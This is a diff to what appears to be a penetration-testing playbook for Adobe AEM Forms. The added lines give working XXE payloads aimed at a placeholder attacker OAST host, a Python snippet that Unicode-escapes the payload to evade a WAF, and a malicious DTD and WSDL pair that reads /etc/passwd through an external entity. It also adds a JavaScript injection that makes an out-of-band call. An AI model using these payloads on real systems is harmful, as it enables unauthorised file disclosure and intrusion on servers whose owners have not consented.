@@ -57,13 +57,42 @@ No write = do not force. Write "needs write" and go NEXT.
 <afData>&a;</afData>
 ```
 
-Check OAST for hit.  
-WAF blocks plain XML? Unicode-escape the whole string (`\u003c` style) — details in `reference/08-aem-forms.md`.
+Check OAST for hit.
+
+**WAF blocks plain XML?** Unicode-escape the whole payload (Egorov tip):
+
+```python
+data = '''<?xml version="1.0" encoding="utf-8"?><!DOCTYPE afData [<!ENTITY a SYSTEM "http://YOUR-OAST/xxe">]><afData>&a;</afData>'''
+print(''.join('\\u%04x' % ord(c) for c in data))
+```
+
+Send that string where the app expects JSON-encoded XML if applicable.
 
 ### 4) Time-box other selectors (max 30 min)
 
-- `af.wsdl` + evil WSDL on your server  
-- `af.submit` JS OOB: `');jQuery.get('http://OAST');//`
+**WSDL XXE (af.wsdl)** — host evil WSDL + DTD:
+
+```xml
+<!-- loot.dtd on YOUR server -->
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
+```
+
+```xml
+<!-- evil.wsdl -->
+<?xml version="1.0"?>
+<!DOCTYPE definitions [
+<!ENTITY % dtd SYSTEM "http://YOUR-OAST/loot.dtd">
+%dtd;
+%param1;
+]>
+```
+
+**JS OOB (af.submit family):**
+
+```text
+');jQuery.get('http://YOUR-OAST');//
+```
 
 ---
 
